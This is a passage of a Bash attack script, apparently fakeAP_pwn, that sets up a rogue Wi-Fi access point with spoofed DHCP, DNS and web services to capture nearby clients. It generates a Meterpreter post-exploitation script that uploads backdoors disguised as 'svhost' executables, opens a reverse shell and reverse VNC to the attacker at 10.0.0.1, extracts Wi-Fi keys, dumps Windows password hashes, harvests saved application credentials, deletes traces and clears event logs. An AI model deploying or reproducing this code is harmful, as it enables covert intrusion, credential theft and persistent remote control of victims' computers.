      if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then action "Install metasploit" "apt-get -y install metasploit" ; fi
      if [ ! -e "/opt/metasploit3/bin/msfconsole" ] ; then
         display error "Failed to install metasploit" 1>&2 ; cleanup
      else
         display info "Installed: metasploit"
      fi
   fi
   if [ "$payload" == "sbd" ] && [ ! -e "/usr/local/bin/sbd" ] ; then
      display error "sbd isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install sbd" "apt-get -y install sbd" ;  fi
      if [ ! -e "/usr/local/bin/sbd" ] ; then
         display error "Failed to install sbd" 1>&2 ; cleanup
      else
         display info "Installed: sbd"
      fi
   elif [ "$payload" == "vnc" ] && [ ! -e "/usr/bin/vncviewer" ] ; then
      display error "vnc isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install vnc" "apt-get -y install vnc" ; fi
      if [ ! -e "/usr/bin/vncviewer" ] ; then
         display error "Failed to install vnc" 1>&2 ; cleanup
      else
         display info "Installed: vnc"
      fi
   elif [ "$payload" == "wkv" ] ; then
      if [ ! -e "$www/wkv-x86.exe" ] ; then display error "There isn't a wkv-x86.exe at $www/wkv-x86.exe." 1>&2 ; cleanup; fi
      if [ ! -e "$www/wkv-x64.exe" ] ; then display error "There isn't a wkv-x64.exe at $www/wkv-x64.exe." 1>&2 ; cleanup; fi
   elif [ "$payload" == "other" ] ; then
      if [ ! -e "$backdoorPath" ] ; then display error "There isn't a backdoor at $backdoorPath." 1>&2 ; cleanup; fi
   fi
fi
if [ "$mode" == "flip" ] ; then
   if [ ! -e "/usr/sbin/squid" ] ; then
      display error "squid isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install squid" "apt-get -y install squid" ;  fi
      if [ ! -e "/usr/sbin/squid" ] ; then
         display error "Failed to install squid" 1>&2 ; cleanup
      else
         display info "Installed: squid"
      fi
   fi
   if [ ! -e "/usr/bin/mogrify" ] ; then
      display error "mogrify isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install mogrify" "apt-get -y install imagemagick" ;  fi
      if [ ! -e "/usr/sbin/squid" ] ; then
         display error "Failed to install mogrify" 1>&2 ; cleanup
      else
         display info "Installed: mogrify"
      fi
   fi
fi
if [ "$extras" == "true" ] ; then
   if [ ! -e "/usr/bin/imsniff" ] ; then
      display error "imsniff isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install imsniff" "apt-get -y install imsniff" ; fi
      if [ ! -e "/usr/bin/imsniff" ] ; then
         display error "Failed to install imsniff" 1>&2 ; cleanup
      else
         display info "Installed: imsniff"
      fi
   fi
   if [ ! -e "/usr/bin/driftnet" ] ; then
      display error "driftnet isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install driftnet" "apt-get -y install driftnet" ; fi
      if [ ! -e "/usr/bin/driftnet" ] ; then
         display error "Failed to install driftnet" 1>&2 ; cleanup
      else
         display info "Installed: driftnet"
      fi
   fi
   if [ ! -e "/pentest/spoofing/sslstrip/sslstrip.py" ] ; then
      display error "sslstrip isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "wget -P /tmp http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.7.tar.gz && tar -C /tmp -xvf /tmp/sslstrip-0.7.tar.gz && rm /tmp/sslstrip-0.7.tar.gz && mkdir -p /pentest/spoofing/sslstrip/ && mv -f /tmp/sslstrip-0.7/* /pentest/spoofing/sslstrip/ && rm -rf /tmp/sslstrip-0.7" $verbose $diagnostics "true" ; fi
      if [ ! -e "/pentest/spoofing/sslstrip/sslstrip.py" ] ; then
         display error "Failed to install sslstrip" 1>&2 ; cleanup
      else
         display info "Installed: sslstrip"
      fi
   fi
   if [ ! -e "/usr/sbin/ettercap" ] ; then
      display error "ettercap isn't installed."
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install ettercap" "apt-get -y install ettercap ettercap-gtk ettercap-common" $verbose $diagnostics "true" ; fi
      if [ ! -e "/usr/sbin/ettercap" ] ; then
         display error "Failed to install ettercap" 1>&2; cleanup
      else
         display info "Installed: ettercap"
      fi
   fi
fi

if [ ! -e "$www/index.php" ] ; then
   if [ ! -d "$www/" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Copying www/" ; fi
      mkdir -p $www
      action "mkdir $www && Copying www/" "cp -rf www/* $www/"
   fi
   if [ ! -e "$www/index.php" ] ; then
      display error "Missing index.php. Did you run: cp -rf www/* $www/" 1>&2
      cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Stopping: Programs" ; fi
action "Killing 'Programs'" "killall airbase-ng hostapd xterm" # "wicd-client"
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Stopping: Daemons" ; fi
action "Killing 'dhcp3 service'" "/etc/init.d/dhcp3-server stop"
if [ "$mode" == "flip" ] ; then action "Killing 'squid service'" "/etc/init.d/squid stop" ; fi
if [ "$mode" != "normal" ] ; then action "Killing 'apache2 service'" "/etc/init.d/apache2 stop" ; fi
#action "Killing 'wicd service'" "/etc/init.d/wicd stop" # Stopping wicd to prevent channel hopping

#----------------------------------------------------------------------------------------------#
action "Refreshing $wifiInterface" "ifconfig $wifiInterface down && ifconfig $wifiInterface up && sleep 1"
command=$(ifconfig | grep -o  "$wifiInterface")
if [ -z $command ] ; then display error "$wifiInterface is down" 1>&2 ; cleanup; fi # check to make sure $interface came up!
command=$(ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
if [ -n "$command" ] ; then
   action "Killing programs" "kill $command" # to prevent interference
fi

if [ "$mode" != "non" ] ; then
   action "Refreshing interface" "ifconfig $interface up && sleep 1"
   if [ -z "$ourIP" ] ; then ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}') ; fi

   command=$(ifconfig | grep -o "$interface")
   if [ "$command" != "$interface" ] ; then
      display error "Can't detect interface ($interface)" 1>&2  # Check to make sure $interface came up or if its correct
      if [ "$debug" == "true" ] ; then ifconfig; fi
      display info "Switching mode: non"
      mode="non"
   fi

   if [ -z "$ourIP" ] && [ "$mode" != "non" ] ; then
      action "Acquiring IP" "dhclient $interface && sleep 3"
      command=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
      if [ -z "$command" ] ; then
         display error "Haven't got an IP address on $interface." 1>&2
         display info "Switching mode: non"
         mode="non"
      else
         ourIP="$command"
      fi
   fi

   command=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
   if [ -z "$command" ] || [ -z "$gateway" ]  && [ "$mode" != "non" ] ; then
      display error "Can't detect the gateway" 1>&2
      display info "Switching mode: non"
      mode="non"
      gateway="10.0.0.1"
   else
      gateway="$command"
   fi
else
   gateway="10.0.0.1"
fi

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: Wireless card" ; fi
if [ "$apType" == "airbase-ng" ] ; then
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" == "$monitorInterface" ] ; then
      action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
      sleep 1
   fi

   action "Monitor Mode (Starting)" "airmon-ng start $wifiInterface | tee /tmp/fakeAP_pwn.tmp"
   command=$(cat /tmp/fakeAP_pwn.tmp | awk '/monitor mode enabled on/ {print $5}' | tr -d '\011' | sed 's/\(.*\)./\1/')
   if [ "$monitorInterface" != "$command" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Configuring: Chaning monitorInterface to: $command" ; fi
      if [ $command ] ; then monitorInterface="$command" ; fi
   fi

   sleep 1
   ifconfig mon0 mtu $mtu
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" != "$monitorInterface" ] ; then
      sleep 5 # Some people need to wait a little bit longer (e.g. VM), some don't. Don't force the ones that don't need it!
      command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
      if [ "$command" != "$monitorInterface" ] ; then
         display error "The monitor interface $monitorInterface, isn't correct." 1>&2
      if [ "$debug" == "true" ] ; then iwconfig; fi
      cleanup
      fi
   fi

#----------------------------------------------------------------------------------------------#
   command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
   if [ "$command" ] ; then # $interface is WiFi. Therefore two WiFi cards
      command=$(iwlist $interface scan 2>/dev/null | grep "essid:")
      if [ "$diagnostics" == "true" ] ; then echo -e $command >> $logFile ; fi
      if [ ! -z "$command" ] ; then   # checking for a access point to test as we haven't created one yet
         if [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
            display diag "Testing: Wireless Injection"
            command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
            if [ "$diagnostics" == "true" ] ; then echo -e $command >> $logFile ; fi
            if [ -z "$(echo \"$command\" | grep 'Injection is working')" ] ; then display error "$monitorInterface doesn't support packet injecting." 1>&2
            elif [ -z "$(echo \"$command\" | grep 'Found 0 APs')" ] ; then display error "Couldn't test packet injection" 1>&2 ;
            fi
         fi
      fi
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$apType" == "airbase-ng" ] ; then
   if [ "$macMode" == "random" ] || [ "$macMode" == "set" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: MAC address" ; fi
      command="ifconfig $monitorInterface down &&"
      if [ "$macMode" == "random" ] ; then command="$command macchanger -A $monitorInterface &&"; fi
      if [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $monitorInterface &&"; fi
      action "Changing MAC Address of FakeAP" "$command ifconfig $monitorInterface up"
      sleep 2
   fi
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ]; then
      fakeMac=$(macchanger --show $monitorInterface | awk -F " " '{print $3}')
      fakeMacType=$(macchanger --show $monitorInterface | awk -F "Current MAC: " '{print $2}')
      display info "fakeMac=$fakeMacType"
   fi
elif [ "$apType" == "hostapd" ] ; then
   if [ "$macMode" == "random" ] || [ "$macMode" == "set" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: MAC address" ; fi
      command="ifconfig $wifiInterface down &&"
      if [ "$macMode" == "random" ] ; then command="$command macchanger -A $wifiInterface"; fi
      if [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $wifiInterface"; fi
      action "Changing MAC Address of FakeAP" "$command && ifconfig $wifiInterface up"
      sleep 2
   fi
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
      fakeMac=$(macchanger --show $wifiInterface | awk -F " " '{print $3}')
      fakeMacType=$(macchanger --show $wifiInterface | awk -F "Current MAC: " '{print $2}')
      display info "fakeMac=$fakeMacType"
   fi
fi
# Do we need to reset gateway/Ip address?

#----------------------------------------------------------------------------------------------#
display action "Creating: Scripts"
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   path="/tmp/fakeAP_pwn.rb" # metasploit script
   if [ -e "$path" ] ; then rm "$path"; fi
   echo "# ID: fakeAP_pwn.rb v$version
# Author: g0tmi1k at http://g0tmi1k.blogspot.com
################## Variable Declarations ##################
@client   = client
host,port = session.tunnel_peer.split(':')
os        = @client.sys.config.sysinfo['OS']
host      = @client.sys.config.sysinfo['Computer']
arch      = @client.sys.config.sysinfo['Architecture']
user      = @client.sys.config.getuid
date      = Time.now.strftime(\"%Y-%m-%d.%H:%M:%S\")
uac       = 0
######################## Functions ########################
def doLinux
	print_status(\"Coming soon\")
end
def doOSX
	print_status(\"Coming soon\")
end
def doWindows(uac)
	session.response_timeout=120
	begin" >> $path
   if [ "$payload" == "vnc" ] ; then echo "		print_status(\"   Stopping: winvnc.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost101.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"  Uploading: VNC\")
		exec = upload(session,\"$www/winvnc.exe\",\"svhost101.exe\",\"\")
		upload(session,\"$www/vnchooks.dll\",\"vnchooks.dll\",\"\")
		upload(session,\"$www/vnc.reg\",\"vnc.reg\",\"\")
		sleep(1)

		print_status(\"Configuring: VNC\")
		execute(session,\"cmd.exe /C regedit.exe /S %TEMP%\\\vnc.reg\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds the for the target to click \\\"yes\\\"\")
			sleep(30)
		end

		print_status(\"  Executing: winvnc (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -kill -run\", nil)
		sleep(1)

		print_status(\"Configuring: VNC (Reserving connection)\")
		execute(session,\"cmd.exe /C #{exec} -connect 10.0.0.1\", nil)

		print_status(\"   Deleting: Traces\")
		delete(session, \"%SystemDrive%\\\vnc.reg\")" >> $path
   elif [ "$payload" == "sbd" ] ; then echo "		print_status(\" Stopping: sbd.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost102.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: SecureBackDoor\")
		exec = upload(session,\"$www/sbd.exe\",\"svhost102.exe\",\"\")
		sleep(1)

		print_status(\"Executing: sbd (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil)" >> $path
   elif [ "$payload" == "wkv" ] ; then echo "	print_status(\"  Uploading: WirelessKeyView\")
		if @client.sys.config.sysinfo['Architecture'] =~ (/x64/)
			exec = upload(session,\"$www/wkv-x64.exe\",\"\",\"\")
		else
			exec = upload(session,\"$www/wkv-x86.exe\",\"\",\"\")
		end
		sleep(1)

		print_status(\"  Executing: wkv (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} /stext %TEMP%\\\wkv.txt\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds the for the target to click \\\"yes\\\"\")
			sleep(30)
		end

		# Check for file!
		print_status(\"Downloading: WiFi keys (/tmp/fakeAP_pwn.wkv)\")
		session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%TEMP%\\\wkv.txt\")

		print_status(\"   Deleting: Traces\")
		delete(session, exec)
		delete(session, \"%TEMP%\\\wkv.txt\")" >> $path
   else echo "		print_status(\"Stopping: backdoor.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost103.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: backdoor.exe ($backdoorPath)\")
		exec = upload(session,\"$backdoorPath\",\"svhost103.exe\",\"\")
		sleep(1)

		print_status(\"Executing: backdoor\")
		execute(session,\"cmd.exe /C #{exec}\", nil)" >> $path
   fi
   echo "		sleep(1)
		return

	rescue ::Exception => e
		print_status(\"Error: #{e.class} #{e}\")
	end
end
def upload(session,file,filename = \"\",trgloc = \"\")
	if not ::File.exists?(file)
		raise \"File to upload does not exists!\"
	else
		if trgloc == \"\"
			location = session.fs.file.expand_path(\"%TEMP%\")
		else
			location = trgloc
		end
		begin
			if filename == \"\"
				ext = file[file.rindex(\".\") .. -1]
				if ext and ext.downcase == \".exe\"
					fileontrgt = \"#{location}\\\svhost#{rand(100)}.exe\"
				else
					fileontrgt = \"#{location}\\\TMP#{rand(100)}#{ext}\"
				end
			else
				fileontrgt = \"#{location}\\\#{filename}\"
			end
			session.fs.file.upload_file(\"#{fileontrgt}\",\"#{file}\")
		rescue ::Exception => e
			print_status(\"Error uploading file #{file}: #{e.class} #{e}\")
		end
	end
	return fileontrgt
end
def execute(session,cmdexe,opt)
	r=''
	session.response_timeout=120
	begin
		r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
		r.close
	rescue ::Exception => e
		print_status(\"Error Running Command #{cmdexe}: #{e.class} #{e}\")
	end
end
def delete(session, path)
   r = session.sys.process.execute(\"cmd.exe /c del /F /S /Q \" + path, nil, {'Hidden' => 'true'})
   while(r.name)
      select(nil, nil, nil, 0.10)
   end
   r.close
end
def checkUAC(session)
	begin
		open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Policies\\\System\", KEY_READ)
		value = open_key.query_value(\"EnableLUA\").data
	rescue ::Exception => e
		print_status(\"Error Checking UAC: #{e.class} #{e}\")
	end
	return (value)
end
########################### Main ##########################
print_line(\"[*] fakeAP_pwn $version\")" >> $path
   #if | [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ||  [ "$debug" == "true" ] ; then
      echo "print_status(\"-------------------------------------------\")
print_status(\"Date: #{date}\")
print_status(\"  IP: #{host}:#{port}\")
print_status(\"  OS: #{os}\")
if os =~ (/Windows Vista/) || os =~ (/Windows 7/)
	uac = checkUAC(session)
	if uac == 1
		print_error(\" UAC: Enabled\")
		session.core.use(\"priv\")
		#run kitrap0d # x86 ONLY
		#client.execute_script(\"script\",\"args\") #client.execute_script(\"multi_console_command\",[\"-cl\",'help,help\"])
	else
		print_status(\" UAC: Disabled\")
	end
end
print_status(\"Arch: #{arch}\")
print_status(\"Host: #{host}\")
print_status(\"User: #{user}\")
print_status(\"Mode: $payload\")
print_status(\"-------------------------------------------\")" >> $path
   #fi
   echo "if os =~ /Linux/
	doLinux
elsif os =~ /OSX/
	doOSX
elsif os =~ /Windows/
#	run getcountermeasure.rb -d
	doWindows(uac)
else
	print_error(\"Unsupported OS\")
	exit
end
print_status(\"Unlocking: fakeAP_pwn\")
output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
output.puts(\"fakeAP_pwn\")
output.close
sleep(1)" >> $path
   if [ "$extras" == "true" ] ; then echo "print_status(\"-------------------------------------------\")
print_status(\"Extras\")
screenshot
#----
session.core.use(\"priv\") #use priv
getsystem
hashes = session.priv.sam_hashes  #hashdump #> /tmp/fakeAP_pwn.hash
####################################################################
   begin
      session.core.use(\"priv\")
      hashes = session.priv.sam_hashes
      print_status(\"Capturing windows hashes \")
      File.open(File.join(logs, \"hashes.txt\"), \"w\") do |fd|
         hashes.each do |user|
            fd.puts(user.to_s)
         end
      end
   rescue ::Exception => e
      print_status(\"Error dumping hashes: #{e.class} #{e}\")
   end
####################################################################
#----
sysinfo
ps
ipconfig
route
#enumdesktops
#getdesktop
#setdesktop
#----
run checkvm.rb
run dumplinks.rb -e
run enum_firefox.rb
run enum_logged_on_users.rb -c -l
run enum_putty.rb
run get_application_list.rb
run getcountermeasure.rb -d -k
run get_env.rb
run get_filezilla_creds.rb -c
run get_loggedon_users.rb -c -l
run get_pidgin_creds.rb -b -c -l
run getvncpw.rb
#run killav.rb
run remotewinenum.rb
run scraper.rb
run winenum.rb -r
#----
clearev
print_status(\"-------------------------------------------\")" >> $path
   fi
   echo "print_line(\"[*] Done!\")" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path" ; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "flip" ] ; then
   path="/tmp/fakeAP_pwn.pl" # Squid script
   if [ -e "$path" ] ; then rm "$path" ; fi
   echo -e "#!/usr/bin/perl
# fakeAP_pwn.pl v$version
$|=1;
\$count = 0;
\$pid = \$\$;
while (<>) {
	chomp \$_;
	if (\$_ =~ /(.*\.jpg)/i) {
		\$url = \$1;
		system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/images/\$pid-\$count.jpg\", \"\$url\");
		system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.jpg\");
		system(\"chmod\", \"666\", \"$www/images/\$pid-\$count.jpg\");
		print \"http://10.0.0.1/images/\$pid-\$count.jpg\\\n\";
	}
	elsif (\$_ =~ /(.*\.jpeg)/i) {
		\$url = \$1;
		system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/images/\$pid-\$count.jpeg\", \"\$url\");
		system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.jpeg\");
		system(\"chmod\", \"666\", \"$www/\$pid-\$count.jpeg\");
		print \"http://10.0.0.1/images/\$pid-\$count.jpeg\\\n\";
	}
	elsif (\$_ =~ /(.*\.gif)/i) {
		\$url = \$1;
		system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/\$pid-\$count.gif\", \"\$url\");
		system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.gif\");
		system(\"chmod\", \"666\", \"$www/\$pid-\$count.gif\");
		print \"http://10.0.0.1/images/\$pid-\$count.gif\\\n\";
	}
	elsif (\$_ =~ /(.*\.png)/i) {
		\$url = \$1;
		system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/\$pid-\$count.png\", \"\$url\");
		system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.png\");
		system(\"chmod\", \"666\", \"$www/\$pid-\$count.png\");
		print \"http://10.0.0.1/images/\$pid-\$count.png\\\n\";
	}
	else {
		print \"\$_\\\n\";;
	}
	\$count++;
}" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path"; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi

#----------------------------------------------------------------------------------------------#
   path="/tmp/fakeAP_pwn.squid" # Squid config
   if [ -e "$path" ] ; then rm "$path" ; fi 
   # Have to use ', instead of "
   echo '# fakeAP_pwn.squid v$version
hierarchy_stoplist cgi-bin ?
acl QUERY urlpath_regex cgi-bin \?
no_cache deny QUERY
hosts_file /etc/hosts
url_rewrite_program /tmp/fakeAP_pwn.pl
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
acl all src all
acl localhost src 127.0.0.1/32
acl to_localhost dst 127.0.0.0/8
acl localnet src 10.0.0.0/8
acl manager proto cache_object
acl SSL_ports port 443          # https
acl SSL_ports port 563          # snews
acl SSL_ports port 873          # rsync
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl Safe_ports port 631         # cups
acl Safe_ports port 873         # rsync
acl Safe_ports port 901         # SWAT
acl purge method PURGE
acl CONNECT method CONNECT
http_access allow manager localhost
http_access deny manager
http_access allow purge localhost
http_access deny purge' > $path
  echo 'http_access deny !Safe_ports' >> $path
  echo 'http_access deny CONNECT !SSL_ports' >> $path
  echo 'http_access allow localnet
http_access allow localhost
http_access deny all
http_reply_access allow all
icp_access deny all
http_port 3128 transparent
visible_hostname myclient.hostname.com
access_log /var/log/squid/access.log squid
acl apache rep_header Server ^Apache
broken_vary_encoding allow apache
extension_methods REPORT MERGE MKACTIVITY CHECKOUT
coredump_dir /var/spool/squid' >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path"; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
path="/tmp/fakeAP_pwn.dhcp" # DHCP script
if [ -e "$path" ] ; then rm "$path"; fi
echo -e "# fakeAP_pwn.dhcp v$version
ddns-update-style none;
ignore client-updates; # Ignore all client requests for DDNS update
authoritative;
default-lease-time 86400; # 24 hours
max-lease-time 172800;    # 48 hours
log-facility local7;\n
subnet 10.0.0.0 netmask 255.255.255.0 {
	range 10.0.0.150 10.0.0.250;
	option routers 10.0.0.1;
	option subnet-mask 255.255.255.0;
	option broadcast-address 10.0.0.255;
	option domain-name \"Home.com\";" >> $path
if [ "$mode" == "normal" ] || [ "$mode" == "flip" ] || [ "$mode" == "transparent" ] ; then
	echo "	option domain-name-servers 208.67.222.220, 208.67.222.222;" >> $path
else
	echo "	option domain-name-servers 10.0.0.1;" >> $path
fi
echo -e "	option netbios-name-servers 10.0.0.100;\n}" >> $path
if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
if [ "$debug" == "true" ] ; then cat "$path" ; fi
if [ ! -e $path ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] ; then
   path="/etc/apache2/sites-available/fakeAP_pwn"
   if [ -e "$path" ] ; then rm "$path"; fi # Apache (Virtual host)
   echo "# fakeAP_pwn v$version
	<VirtualHost *:80>
		ServerAdmin webmaster@localhost
		DocumentRoot $www
		ServerName \"10.0.0.1\"
		<Directory />
			Options FollowSymLinks
			AllowOverride None
		</Directory>
		<Directory $www>
			Options Indexes FollowSymLinks MultiViews
			AllowOverride None
			Order allow,deny
			allow from all
		</Directory>
		ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
		<directory \"/usr/lib/cgi-bin\">
			AllowOverride None
			Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
			Order allow,deny
			Allow from all
		</directory>
		ErrorLog /var/log/apache2/fakeAP_pwn-error.log
		LogLevel warn
		CustomLog /var/log/apache2/fakeAP_pwn-access.log combined
		ErrorDocument 403 /index.php
		ErrorDocument 404 /index.php
	</VirtualHost>
	<IfModule mod_ssl.c>
		<VirtualHost _default_:443>
			ServerAdmin webmaster@localhost
			DocumentRoot $www
			ServerName \"10.0.0.1\"
			<Directory />
				Options FollowSymLinks
				AllowOverride None
			</Directory>
			<Directory $www>
				Options Indexes FollowSymLinks MultiViews
				AllowOverride None
				Order allow,deny
				allow from all
			</Directory>
			<directory \"/usr/lib/cgi-bin\">
				AllowOverride None
				Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
				Order allow,deny
				Allow from all
			</directory>
			ErrorLog /var/log/apache2/error.log
			LogLevel warn
			CustomLog /var/log/apache2/ssl_fakeAP_pwn-access.log combined
			ErrorDocument 403 /index.php
			ErrorDocument 404 /index.php
			SSLEngine on
			SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
			SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
			<FilesMatch \"\.(cgi|shtml|phtml|php)$\">
				SSLOptions +StdEnvVars
			</FilesMatch>
			<Directory /usr/lib/cgi-bin>
				SSLOptions +StdEnvVars
			</Directory>
			BrowserMatch \"MSIE [2-6]\" \
				nokeepalive ssl-unclean-shutdown \
				downgrade-1.0 force-response-1.0
			BrowserMatch \"MSIE [17-9]\" ssl-unclean-shutdown
		</VirtualHost>
	</IfModule>" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path" ; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   path="/tmp/fakeAP_pwn.dns" # DNS script
   if [ -e "$path" ] ; then rm "$path" ; fi
   echo -e "# fakeAP_pwn.dns v$version\n10.0.0.1 *" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat "$path" ; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$apType" == "hostapd" ] ; then
   path="/tmp/fakeAP_pwn.hostapd" # Hostapd config
   if [ -e "$path" ] ; then rm "$path"; fi
   echo "# fakeAP_pwn.hostapd v$version
interface=$apInterface
driver=nl80211
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
dump_file=/tmp/fakeAP_pwn.hostapd.dump
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0
ssid=$essid
hw_mode=g
channel=$channel
beacon_int=100
dtim_period=2
max_num_sta=255
rts_threshold=2347
fragm_threshold=2346
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0
eapol_key_index_workaround=0
eap_server=0
own_ip_addr=127.0.0.1
#wmm_enabled=1
#wmm_ac_bk_cwmin=4
#wmm_ac_bk_cwmax=10
#wmm_ac_bk_aifs=7
#wmm_ac_bk_txop_limit=0
#wmm_ac_bk_acm=0
#wmm_ac_be_aifs=3
#wmm_ac_be_cwmin=4
#wmm_ac_be_cwmax=10
#wmm_ac_be_txop_limit=0
#wmm_ac_be_acm=0
#wmm_ac_vi_aifs=2
#wmm_ac_vi_cwmin=3
#wmm_ac_vi_cwmax=4
#wmm_ac_vi_txop_limit=94
#wmm_ac_vi_acm=0
#wmm_ac_vo_aifs=2
#wmm_ac_vo_cwmin=2
#wmm_ac_vo_cwmax=3
